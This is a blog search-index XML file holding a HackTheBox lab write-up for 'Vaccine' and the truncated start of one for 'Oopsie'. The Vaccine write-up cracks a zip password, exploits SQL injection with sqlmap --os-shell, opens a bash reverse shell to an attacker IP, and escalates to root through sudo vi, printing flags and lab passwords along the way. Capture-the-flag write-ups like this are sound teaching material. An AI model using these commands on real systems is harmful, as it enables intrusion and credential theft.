<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vaccine</title>
      <link href="/2024/05/24/Vaccine/"/>
      <url>/2024/05/24/Vaccine/</url>
      
        <content type="html"><![CDATA[<p><img src="/../vaccine_img/4abda8d32b5c71e6905244988879c575.webp" alt="alt text"></p><p>Machine IP: 10.129.230.39</p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h2><ul><li>command used: (scanning for all ports fast and efficient)</li></ul><pre><code class="hljs powershell">sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">230.39</span></code></pre><p>→ output:</p><pre><code class="hljs powershell">Not shown: <span class="hljs-number">65515</span> closed tcp ports (reset), <span class="hljs-number">17</span> filtered tcp ports (no<span class="hljs-literal">-response</span>)Some closed ports may be reported as filtered due to <span class="hljs-literal">--defeat-rst-ratelimit</span>PORT   STATE SERVICE REASON<span class="hljs-number">21</span>/tcp open  ftp     syn<span class="hljs-literal">-ack</span> ttl <span class="hljs-number">63</span><span class="hljs-number">22</span>/tcp open  ssh     syn<span class="hljs-literal">-ack</span> ttl <span class="hljs-number">63</span><span class="hljs-number">80</span>/tcp open  http    syn<span class="hljs-literal">-ack</span> ttl <span class="hljs-number">63</span></code></pre><ul><li>command used: ( scanning the ports we got )</li></ul><pre><code class="hljs bash">nmap -A -sC -sV -p</code></pre><p>→ output:</p><pre><code class="hljs powershell">Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-23</span> <span class="hljs-number">22</span>:<span class="hljs-number">46</span> EDTNmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">230.39</span>Host is up (<span class="hljs-number">0.046</span>s latency).PORT   STATE SERVICE VERSION<span class="hljs-number">21</span>/tcp open  ftp     vsftpd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span>| ftp<span class="hljs-literal">-anon</span>: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)|_<span class="hljs-literal">-rwxr-xr-x</span>    <span class="hljs-number">1</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">2533</span> Apr <span class="hljs-number">13</span>  <span class="hljs-number">2021</span> backup.zip| ftp<span class="hljs-literal">-syst</span>: |   STAT: | FTP server status:|      Connected to ::ffff:<span class="hljs-number">10.10</span>.<span class="hljs-number">14.82</span>|      Logged <span class="hljs-keyword">in</span> as ftpuser|      <span class="hljs-built_in">TYPE</span>: ASCII|      No session bandwidth limit|      Session timeout <span class="hljs-keyword">in</span> seconds is <span class="hljs-number">300</span>|      Control connection is plain text|      <span class="hljs-keyword">Data</span> connections will be plain text|      At session startup, client count was <span class="hljs-number">4</span>|      vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - secure, fast, stable|_End of status<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.0</span>p1 Ubuntu <span class="hljs-number">6</span>ubuntu0.<span class="hljs-number">1</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)| ssh<span class="hljs-literal">-hostkey</span>: |   <span class="hljs-number">3072</span> c0:ee:<span class="hljs-number">58</span>:<span class="hljs-number">07</span>:<span class="hljs-number">75</span>:<span class="hljs-number">34</span>:b0:<span class="hljs-number">0</span>b:<span class="hljs-number">91</span>:<span class="hljs-number">65</span>:b2:<span class="hljs-number">59</span>:<span class="hljs-number">56</span>:<span class="hljs-number">95</span>:<span class="hljs-number">27</span>:a4 (RSA)|   <span class="hljs-number">256</span> <span class="hljs-built_in">ac</span>:<span class="hljs-number">6</span>e:<span class="hljs-number">81</span>:<span class="hljs-number">18</span>:<span class="hljs-number">89</span>:<span class="hljs-number">22</span>:d7:a7:<span class="hljs-number">41</span>:<span class="hljs-number">7</span>d:<span class="hljs-number">81</span>:<span class="hljs-number">4</span>f:<span class="hljs-number">1</span>b:b8:b2:<span class="hljs-number">51</span> (ECDSA)|_  <span class="hljs-number">256</span> <span class="hljs-number">42</span>:<span class="hljs-number">5</span>b:c3:<span class="hljs-number">21</span>:df:ef:a2:<span class="hljs-number">0</span>b:c9:<span class="hljs-number">5</span>e:<span class="hljs-number">03</span>:<span class="hljs-number">42</span>:<span class="hljs-number">1</span>d:<span class="hljs-number">69</span>:d0:<span class="hljs-number">28</span> (ED25519)<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> ((Ubuntu))|_http<span class="hljs-literal">-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)| http<span class="hljs-literal">-cookie-flags</span>: |   /: |     PHPSESSID: |_      httponly flag not <span class="hljs-built_in">set</span>|_http<span class="hljs-literal">-title</span>: MegaCorp LoginWarning: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed portAggressive OS guesses: Linux <span class="hljs-number">4.15</span> - <span class="hljs-number">5.8</span> (<span class="hljs-number">96</span>%), Linux <span class="hljs-number">5.0</span> (<span class="hljs-number">96</span>%), Linux <span class="hljs-number">3.1</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">3.2</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">5.3</span> - <span class="hljs-number">5.4</span> (<span class="hljs-number">95</span>%), AXIS <span class="hljs-number">210</span>A or <span class="hljs-number">211</span> Network Camera (Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">17</span>) (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">5.0</span> - <span class="hljs-number">5.5</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span> (<span class="hljs-number">94</span>%), ASUS RT<span class="hljs-literal">-N56U</span> WAP (Linux <span class="hljs-number">3.4</span>) (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">3.16</span> (<span class="hljs-number">93</span>%)No exact OS matches <span class="hljs-keyword">for</span> host (test conditions non<span class="hljs-literal">-ideal</span>).Network Distance: <span class="hljs-number">2</span> hopsService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (<span class="hljs-keyword">using</span> port 21/tcp)HOP RTT      ADDRESS<span class="hljs-number">1</span>   <span class="hljs-number">44.65</span> ms <span class="hljs-number">10.10</span>.<span class="hljs-number">14.1</span><span class="hljs-number">2</span>   <span class="hljs-number">46.96</span> ms <span class="hljs-number">10.129</span>.<span class="hljs-number">230.39</span></code></pre><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p><p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p><p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p><p>-&gt; SSH package version:</p><pre><code class="hljs bash">nc -vn 10.129.230.39 22</code></pre><ul><li>output:</li></ul><pre><code class="hljs bash">└─$ nc -vn 10.129.230.39 22(UNKNOWN) [10.129.230.39] 22 (ssh) openSSH-2.0-OpenSSH_8.0p1 Ubuntu-6ubuntu0.1</code></pre><p>-&gt; SSH key fingerprint:</p><pre><code class="hljs bash">ssh root@10.129.230.39</code></pre><ul><li>output:</li></ul><pre><code class="hljs bash">└─$ ssh root@10.129.230.39The authenticity of host <span class="hljs-string">&#x27;10.129.230.39 (10.129.230.39)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><span class="hljs-string">ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.</span><span class="hljs-string">This key is not known by any other names.</span><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? </span></code></pre><h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><ul><li><blockquote><p>curl:</p></blockquote></li></ul><pre><code class="hljs bash">└─$ curl -i http://10.129.230.39 | <span class="hljs-built_in">head</span> -n 50  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  2312  100  2312    0     0  23303      0 --:--:-- --:--:-- --:--:-- 23353HTTP/1.1 200 OKDate: Fri, 24 May 2024 03:04:14 GMTServer: Apache/2.4.41 (Ubuntu)Set-Cookie: PHPSESSID=uuvnulvd19llu6dpi80lebqug9; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidatePragma: no-cacheVary: Accept-EncodingContent-Length: 2312Content-Type: text/html; charset=UTF-8&lt;!DOCTYPE html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span> &gt;&lt;<span class="hljs-built_in">head</span>&gt;  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;  &lt;title&gt;MegaCorp Login&lt;/title&gt;  &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Open+Sans:400,700&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;&lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;./style.css&quot;</span>&gt;&lt;/head&gt;  &lt;h1 align=center&gt;MegaCorp Login&lt;/h1&gt;</code></pre><h3 id="TCP-21-ftp"><a href="#TCP-21-ftp" class="headerlink" title="TCP 21 (ftp)"></a>TCP 21 (ftp)</h3><p>→ Login anonymously:</p><pre><code class="hljs bash">└─$ ftp 10.129.230.39Connected to 10.129.230.39.220 (vsFTPd 3.0.3)Name (10.129.230.39:kali): anonymous331 Please specify the password.Password: 230 Login successful.</code></pre><p>→ Get the file </p><pre><code class="hljs bash">ftp&gt; <span class="hljs-built_in">ls</span> -la229 Entering Extended Passive Mode (|||10763|)150 Here comes the directory listing.drwxr-xr-x    2 0        0            4096 Apr 13  2021 .drwxr-xr-x    2 0        0            4096 Apr 13  2021 ..-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip226 Directory send OK.ftp&gt; get backup.zip<span class="hljs-built_in">local</span>: backup.zip remote: backup.zip229 Entering Extended Passive Mode (|||10401|)150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> backup.zip (2533 bytes).100% |*****************************************************************************************************************************************************************|  2533      808.11 KiB/s    00:00 ETA226 Transfer complete.2533 bytes received <span class="hljs-keyword">in</span> 00:00 (49.96 KiB/s)</code></pre><p>Besides SSH and HTTP, what other service is hosted on this box? </p><ul><li>FTP</li></ul><p>This service can be configured to allow login with any password for specific username. What is that username? </p><ul><li>anonymous</li></ul><p> What is the name of the file downloaded over this service? </p><ul><li>backup.zip</li></ul><p> What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? </p><ul><li>zip2john</li></ul><p>→ Generate a hash from <code>backup.zip</code> with zip2john:</p><pre><code class="hljs bash">└─$ zip2john backup.zip &gt; protected.hash</code></pre><pre><code class="hljs bash">└─$ <span class="hljs-built_in">cat</span> protected.hash       backup.zip:$pkzip<span class="hljs-variable">$2</span>*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip</code></pre><p>→ Now we crack the hash:</p><pre><code class="hljs bash">└─$ john protected.hash</code></pre><ul><li>output:</li></ul><pre><code class="hljs bash">Proceeding with wordlist:/usr/share/john/password.lst741852963        (backup.zip)</code></pre><p>→ Let’s see the password in a more readable format with —show:</p><pre><code class="hljs bash">└─$ john --show protected.hashbackup.zip:741852963::backup.zip:style.css, index.php:backup.zip1 password <span class="hljs-built_in">hash</span> cracked, 0 left</code></pre><p>→ Unzip the archieve with the password we got : <code>741852963</code></p><pre><code class="hljs bash">└─$ unzip -P 741852963 backup.zip -d extracted_files</code></pre><p>→ Go into the extracted_files:</p><pre><code class="hljs bash">└─$ <span class="hljs-built_in">cd</span> extracted_files                                                                                                                                                                                                               ┌──(kali㉿kali)-[~/Downloads/extracted_files]└─$ <span class="hljs-built_in">ls</span>index.php  style.css</code></pre><p> Interesting.. </p><p>→ Let’s check index.php:</p><pre><code class="hljs bash">└─$ nano index.php</code></pre><ul><li>output:</li></ul><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</code></pre><p>username: admin</p><p>password: 2cb42f8734ea607eefed3b70af13bbd3</p><p>It seems like the <code>password</code> is cracked let’s head into <a href="http://crackstation.net/">crackstation.net</a> and try to see if we get the password:</p><p><img src="/../vaccine_img/1.png" alt="alt text"></p><p>Password: <code>qwerty789</code></p><p>Check basic sql: </p><p><img src="/../vaccine_img/2.png" alt="alt text"></p><p>We can see that what we type in the search parameter is passed by in the URL, i think this web app is vulnerable to Error Based SQLi so, let’s intercept a request with BurpSuite to see what method we get while searching. (POST or GET)</p><p><img src="/../vaccine_img/3.png" alt="alt text"></p><p>When searching with the search parameter the request is <code>GET</code> </p><p>→ Let’s copy the PHPSESSID and use sqlmap:</p><p><img src="/../vaccine_img/4.png" alt="alt text"></p><p><code>h36ve0ev3rirnii4toagi9vc9v</code></p><h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><ul><li>command:</li></ul><pre><code class="hljs bash">─$ sqlmap -u <span class="hljs-string">&#x27;http://10.129.91.50/dashboard.php?search=abracadabra&#x27;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=h36ve0ev3rirnii4toagi9vc9v&quot;</span> --os-shell</code></pre><p>→output:</p><pre><code class="hljs bash">[02:36:02] [INFO] the back-end DBMS is PostgreSQLweb server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)web application technology: Apache 2.4.41back-end DBMS: PostgreSQL[02:36:02] [INFO] fingerprinting the back-end DBMS operating system[02:36:02] [INFO] the back-end DBMS operating system is Linux[02:36:02] [INFO] testing <span class="hljs-keyword">if</span> current user is DBA[02:36:03] [INFO] retrieved: <span class="hljs-string">&#x27;1&#x27;</span>[02:36:03] [INFO] going to use <span class="hljs-string">&#x27;COPY ... FROM PROGRAM ...&#x27;</span> <span class="hljs-built_in">command</span> execution[02:36:03] [INFO] calling Linux OS shell. To quit <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;x&#x27;</span> or <span class="hljs-string">&#x27;q&#x27;</span> and press ENTERos-shell&gt;</code></pre><p> What option can be passed to sqlmap to try to get command execution via the sql injection? </p><ul><li>–os-shell</li></ul><p>Now we have shell</p><pre><code class="hljs bash">os-shell&gt; <span class="hljs-built_in">id</span>[02:44:12] [INFO] retrieved: <span class="hljs-string">&#x27;uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)&#x27;</span><span class="hljs-built_in">command</span> standard output: <span class="hljs-string">&#x27;uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)&#x27;</span></code></pre><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>→ Start a nc listener on your machine:</p><pre><code class="hljs bash">└─$ sudo nc -lvnp 6666</code></pre><p>→ On your os-shell do this :</p><pre><code class="hljs bash">bash -c “bash -i &gt;&amp; /dev/tcp/&#123;your_ip&#125;/6666 0&gt;&amp;1”</code></pre><ul><li>output:(we got the shell)</li></ul><p><img src="/../vaccine_img/5.png" alt="alt text"></p><p>→ Spawning a &#x2F;bin&#x2F;bash using python:</p><ul><li>command:</li></ul><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;bin/bash&quot;);&#x27;</span></code></pre><p>→ Go into <code>/var/lib/postgresql</code> :</p><pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql/11$ <span class="hljs-built_in">cd</span> /var/lib/postgresql<span class="hljs-built_in">cd</span> /var/lib/postgresqlpostgres@vaccine:/var/lib/postgresql$ <span class="hljs-built_in">ls</span> -la<span class="hljs-built_in">ls</span> -latotal 24drwxr-xr-x  5 postgres postgres 4096 Oct 11  2021 .drwxr-xr-x 39 root     root     4096 Jul 23  2021 ..drwxr-xr-x  3 postgres postgres 4096 Jul 23  2021 11lrwxrwxrwx  1 root     root        9 Feb  4  2020 .bash_history -&gt; /dev/nulldrwxrwxr-x  3 postgres postgres 4096 Jul 23  2021 .<span class="hljs-built_in">local</span>lrwxrwxrwx  1 root     root        9 Feb  4  2020 .psql_history -&gt; /dev/nulldrwx------  2 postgres postgres 4096 Jul 23  2021 .ssh-r--------  1 postgres postgres   33 Oct 11  2021 user.txt</code></pre><p>Read user.txt</p><pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql$ <span class="hljs-built_in">cat</span> user.txt<span class="hljs-built_in">cat</span> user.txtec9b13ca4d6229cd5cc1e09980965bf7</code></pre><p>User flag: ec9b13ca4d6229cd5cc1e09980965bf7</p><p>→ Check <code>/var/www/html</code></p><pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql/11/main$ <span class="hljs-built_in">cd</span> /var/www/html<span class="hljs-built_in">cd</span> /var/www/htmlpostgres@vaccine:/var/www/html$ <span class="hljs-built_in">ls</span> -la<span class="hljs-built_in">ls</span> -latotal 392drwxr-xr-x 2 root root   4096 Jul 23  2021 .drwxr-xr-x 3 root root   4096 Jul 23  2021 ..-rw-rw-r-- 1 root root 362847 Feb  3  2020 bg.png-rw-r--r-- 1 root root   4723 Feb  3  2020 dashboard.css-rw-r--r-- 1 root root     50 Jan 30  2020 dashboard.js-rw-r--r-- 1 root root   2313 Feb  4  2020 dashboard.php-rw-r--r-- 1 root root   2594 Feb  3  2020 index.php-rw-r--r-- 1 root root   1100 Jan 30  2020 license.txt-rw-r--r-- 1 root root   3274 Feb  3  2020 style.csspostgres@vaccine:/var/www/html$ <span class="hljs-built_in">cat</span> dasboard.php | grep password<span class="hljs-built_in">cat</span> dasboard.php | grep password<span class="hljs-built_in">cat</span>: dasboard.php: No such file or directorypostgres@vaccine:/var/www/html$ <span class="hljs-built_in">cat</span> dashboard.php | grep password<span class="hljs-built_in">cat</span> dashboard.php | grep password          <span class="hljs-variable">$conn</span> = pg_connect(<span class="hljs-string">&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;</span>);</code></pre><p>user&#x3D;postgres password&#x3D;P@s5w0rd!</p><p>→ Connnect to ssh usingn this password and username :</p><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]└─$ ssh postgres@10.129.91.50The authenticity of host <span class="hljs-string">&#x27;10.129.91.50 (10.129.91.50)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><span class="hljs-string">ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.</span><span class="hljs-string">This host key is known by the following other names/addresses:</span><span class="hljs-string">    ~/.ssh/known_hosts:1: [hashed name]</span><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><span class="hljs-string">Warning: Permanently added &#x27;</span>10.129.91.50<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><span class="hljs-string">postgres@10.129.91.50&#x27;</span>s password: Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Fri 24 May 2024 07:07:29 AM UTC  System load:  0.01              Processes:             195  Usage of /:   32.6% of 8.73GB   Users logged <span class="hljs-keyword">in</span>:       0  Memory usage: 19%               IP address <span class="hljs-keyword">for</span> ens160: 10.129.91.50  Swap usage:   0%0 updates can be installed immediately.0 of these updates are security updates.The list of available updates is more than a week old.To check <span class="hljs-keyword">for</span> new updates run: sudo apt updateThe programs included with the Ubuntu system are free software;the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> theindividual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.postgres@vaccine:~$</code></pre><p>→ sudo -l </p><pre><code class="hljs bash">postgres@vaccine:~$ sudo -l[sudo] password <span class="hljs-keyword">for</span> postgres: Matching Defaults entries <span class="hljs-keyword">for</span> postgres on vaccine:    env_keep+=<span class="hljs-string">&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;</span>, env_keep+=<span class="hljs-string">&quot;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH&quot;</span>, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,    mail_badpassUser postgres may run the following commands on vaccine:    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</code></pre><p>→ Head out to GTFOBins and check for vi</p><p><a href="https://gtfobins.github.io/gtfobins/vi/">https://gtfobins.github.io/gtfobins/vi/</a></p><p><img src="/../vaccine_img/6.png" alt="alt text"></p><pre><code class="hljs bash">vi:<span class="hljs-built_in">set</span> shell=/bin/sh:shell</code></pre><p>→ run this</p><pre><code class="hljs bash">sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</code></pre><p>shift + <code>:</code> set shell&#x3D;&#x2F;bin&#x2F;sh</p><p><img src="/../vaccine_img/7.png" alt="alt text"></p><p>→ <code>return</code> → esc → &#96;shel&#96;&#96; → return </p><p><img src="/../vaccine_img/8.png" alt="alt text"></p><p>→ We got root:</p><p><img src="/../vaccine_img/9.png" alt="alt text"></p><pre><code class="hljs bash"><span class="hljs-comment"># whoami</span>root<span class="hljs-comment"># cd /root</span><span class="hljs-comment"># ls</span>pg_hba.conf  root.txt  snap<span class="hljs-comment"># cat root.txt</span>dd6e058e814260bc70e9bbdef2715849</code></pre><p>Root flag: <code>dd6e058e814260bc70e9bbdef2715849</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oopsie</title>
      <link href="/2024/05/24/Oopsie/"/>
      <url>/2024/05/24/Oopsie/</url>
      
        <content type="html"><![CDATA[<p><img src="/../oopsie_img/c5843e27067b877dfba7a82e4209a279.png" alt="alt text"></p><p>Machine IP: 10.129.247.167</p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning:"></a>NMAP Scanning:</h2><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/…/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>/<span class="hljs-type">oopsie</span>]└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">247.167</span>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: Host discovery disabled (<span class="hljs-literal">-Pn</span>). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan times may be slower.Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-21</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span> EDTInitiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">13</span>:<span class="hljs-number">42</span>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">13</span>:<span class="hljs-number">42</span>, <span class="hljs-number">0.02</span>s elapsedDNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.02</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><span class="hljs-type">Initiating</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span><span class="hljs-type">Scanning</span> <span class="hljs-number">10.129</span><span class="hljs-type">.247.167</span> [<span class="hljs-number">65535</span> <span class="hljs-type">ports</span>]<span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">80</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.247.167</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">22</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.247.167</span><span class="hljs-type">Completed</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span>, <span class="hljs-number">13.36</span><span class="hljs-type">s</span> <span class="hljs-type">elapsed</span> (<span class="hljs-number">65535</span> <span class="hljs-type">total</span> <span class="hljs-type">ports</span>)<span class="hljs-type">Nmap</span> <span class="hljs-type">scan</span> <span class="hljs-type">report</span> <span class="hljs-type">for</span> <span class="hljs-number">10.129</span><span class="hljs-type">.247.167</span><span class="hljs-type">Host</span> <span class="hljs-type">is</span> <span class="hljs-type">up</span>, <span class="hljs-type">received</span> <span class="hljs-type">user</span>-<span class="hljs-type">set</span> (<span class="hljs-number">0.048</span><span class="hljs-type">s</span> <span class="hljs-type">latency</span>)<span class="hljs-type">.</span><span class="hljs-type">Scanned</span> <span class="hljs-type">at</span> <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">21</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span>:<span class="hljs-number">27</span> <span class="hljs-type">EDT</span> <span class="hljs-type">for</span> <span class="hljs-number">13</span><span class="hljs-type">s</span><span 